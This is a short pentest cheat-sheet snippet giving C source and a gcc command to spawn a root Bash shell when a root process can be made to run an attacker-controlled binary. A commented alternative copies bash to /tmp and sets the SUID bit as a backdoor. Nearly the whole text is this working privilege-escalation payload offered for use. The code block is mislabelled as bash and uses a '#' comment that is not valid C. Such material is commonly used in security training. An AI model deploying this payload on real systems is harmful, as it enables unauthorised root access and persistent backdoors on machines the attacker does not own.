There may be instances where some root process executes another process which you can control. In these cases, the following C code, once compiled, will spawn a Bash shell running as root:

==privesc.c==

---
```bash - target
int main() {
 setuid(0);
 system("/bin/bash -p");
 #system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");

}
```

```bash - target
gcc privesc.c -o privesc 
```
